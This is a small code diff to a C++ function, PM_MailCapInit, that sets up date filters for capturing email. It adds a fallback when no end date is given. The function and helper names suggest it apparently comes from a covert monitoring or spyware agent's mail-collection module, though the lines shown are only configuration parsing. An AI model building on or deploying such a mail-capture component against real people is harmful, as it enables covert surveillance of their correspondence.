@@ -85,7 +85,13 @@ DWORD __stdcall PM_MailCapInit(JSONObject elem)
 	g_mail_filter.search_string[1] = 0;
 	
 	HM_TimeStringToFileTime(filter[L"datefrom"]->AsString().c_str(), &g_mail_filter.min_date);
-	HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);	
+			
+	if (filter[L"dateto"]) 
+		HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);	
+	else {
+		g_mail_filter.max_date.dwHighDateTime = 0xffffffff;
+		g_mail_filter.max_date.dwLowDateTime = 0xffffffff;
+	}
 
 	max_social_mail_len = g_mail_filter.max_size;
 
